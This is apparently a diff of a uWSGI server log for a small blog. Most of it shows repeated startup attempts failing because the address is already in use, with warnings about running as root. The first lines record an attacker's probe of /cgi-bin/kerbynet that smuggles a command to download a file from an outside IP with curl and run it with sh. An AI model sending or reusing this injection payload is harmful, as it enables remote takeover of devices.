@@ -2765,3 +2765,234 @@ spawned uWSGI worker 4 (pid: 5897, cores: 2)
 [pid: 5896|app: 0|req: 26/98] 35.220.212.207 () {26 vars in 543 bytes} [Wed Jul 29 10:33:27 2020] GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 => generated 179 bytes in 2 msecs (HTTP/1.0 404) 4 headers in 128 bytes (1 switches on core 0)
 [pid: 5896|app: 0|req: 27/99] 35.220.212.207 () {26 vars in 544 bytes} [Wed Jul 29 10:33:27 2020] GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 => generated 179 bytes in 1 msecs (HTTP/1.0 404) 4 headers in 128 bytes (1 switches on core 1)
 [pid: 5897|app: 0|req: 46/100] 1.193.70.82 () {44 vars in 792 bytes} [Wed Jul 29 11:03:20 2020] GET /resiger => generated 2608 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Sun Sep 27 23:47:52 2020] ***
+compiled with version: 5.4.0 20160609 on 25 August 2020 04:31:06
+os: Linux-4.4.0-185-generic #215-Ubuntu SMP Mon Jun 8 21:53:19 UTC 2020
+nodename: iZbp1f6ny071dos5kjdhl4Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/xob/myblog
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/xob/myblog
+your processes number limit is 7829
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+probably another instance of uWSGI is running on the same address (172.31.124.243:8000).
+bind(): Address already in use [core/socket.c line 769]
+*** Starting uWSGI 2.0.19.1 (64bit) on [Sun Sep 27 23:52:54 2020] ***
+compiled with version: 5.4.0 20160609 on 25 August 2020 04:31:06
+os: Linux-4.4.0-185-generic #215-Ubuntu SMP Mon Jun 8 21:53:19 UTC 2020
+nodename: iZbp1f6ny071dos5kjdhl4Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/xob/myblog
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/xob/myblog
+your processes number limit is 7829
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+probably another instance of uWSGI is running on the same address (172.31.124.243:8000).
+bind(): Address already in use [core/socket.c line 769]
+*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Sep 28 12:40:10 2020] ***
+compiled with version: 5.4.0 20160609 on 25 August 2020 04:31:06
+os: Linux-4.4.0-185-generic #215-Ubuntu SMP Mon Jun 8 21:53:19 UTC 2020
+nodename: iZbp1f6ny071dos5kjdhl4Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/xob/myblog
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/xob/myblog
+your processes number limit is 7829
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+probably another instance of uWSGI is running on the same address (172.31.124.243:8000).
+bind(): Address already in use [core/socket.c line 769]
+*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Sep 28 12:43:35 2020] ***
+compiled with version: 5.4.0 20160609 on 25 August 2020 04:31:06
+os: Linux-4.4.0-185-generic #215-Ubuntu SMP Mon Jun 8 21:53:19 UTC 2020
+nodename: iZbp1f6ny071dos5kjdhl4Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/xob/myblog
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/xob/myblog
+your processes number limit is 7829
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+probably another instance of uWSGI is running on the same address (172.31.124.243:8000).
+bind(): Address already in use [core/socket.c line 769]
+*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Sep 28 17:02:04 2020] ***
+compiled with version: 5.4.0 20160609 on 25 August 2020 04:31:06
+os: Linux-4.4.0-185-generic #215-Ubuntu SMP Mon Jun 8 21:53:19 UTC 2020
+nodename: iZbp1f6ny071dos5kjdhl4Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/xob/myblog
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/xob/myblog
+your processes number limit is 7829
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+probably another instance of uWSGI is running on the same address (172.31.124.243:8000).
+bind(): Address already in use [core/socket.c line 769]
+*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Sep 28 17:10:47 2020] ***
+compiled with version: 5.4.0 20160609 on 25 August 2020 04:31:06
+os: Linux-4.4.0-185-generic #215-Ubuntu SMP Mon Jun 8 21:53:19 UTC 2020
+nodename: iZbp1f6ny071dos5kjdhl4Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/xob/myblog
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/xob/myblog
+your processes number limit is 7829
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+probably another instance of uWSGI is running on the same address (172.31.124.243:8000).
+bind(): Address already in use [core/socket.c line 769]
+*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Sep 28 18:52:03 2020] ***
+compiled with version: 5.4.0 20160609 on 25 August 2020 04:31:06
+os: Linux-4.4.0-185-generic #215-Ubuntu SMP Mon Jun 8 21:53:19 UTC 2020
+nodename: iZbp1f6ny071dos5kjdhl4Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/xob/myblog
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/xob/myblog
+your processes number limit is 7829
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+probably another instance of uWSGI is running on the same address (172.31.124.243:8000).
+bind(): Address already in use [core/socket.c line 769]
+*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Sep 28 18:53:44 2020] ***
+compiled with version: 5.4.0 20160609 on 25 August 2020 04:31:06
+os: Linux-4.4.0-185-generic #215-Ubuntu SMP Mon Jun 8 21:53:19 UTC 2020
+nodename: iZbp1f6ny071dos5kjdhl4Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/xob/myblog
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/xob/myblog
+your processes number limit is 7829
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+probably another instance of uWSGI is running on the same address (172.31.124.243:8000).
+bind(): Address already in use [core/socket.c line 769]
+*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Sep 28 18:54:50 2020] ***
+compiled with version: 5.4.0 20160609 on 25 August 2020 04:31:06
+os: Linux-4.4.0-185-generic #215-Ubuntu SMP Mon Jun 8 21:53:19 UTC 2020
+nodename: iZbp1f6ny071dos5kjdhl4Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/xob/myblog
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/xob/myblog
+your processes number limit is 7829
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+probably another instance of uWSGI is running on the same address (172.31.124.243:8000).
+bind(): Address already in use [core/socket.c line 769]
+*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Sep 28 18:55:27 2020] ***
+compiled with version: 5.4.0 20160609 on 25 August 2020 04:31:06
+os: Linux-4.4.0-185-generic #215-Ubuntu SMP Mon Jun 8 21:53:19 UTC 2020
+nodename: iZbp1f6ny071dos5kjdhl4Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/xob/myblog
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/xob/myblog
+your processes number limit is 7829
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+probably another instance of uWSGI is running on the same address (172.31.124.243:8000).
+bind(): Address already in use [core/socket.c line 769]
+*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Sep 28 18:57:05 2020] ***
+compiled with version: 5.4.0 20160609 on 25 August 2020 04:31:06
+os: Linux-4.4.0-185-generic #215-Ubuntu SMP Mon Jun 8 21:53:19 UTC 2020
+nodename: iZbp1f6ny071dos5kjdhl4Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/xob/myblog
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/xob/myblog
+your processes number limit is 7829
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+probably another instance of uWSGI is running on the same address (172.31.124.243:8000).
+bind(): Address already in use [core/socket.c line 769]
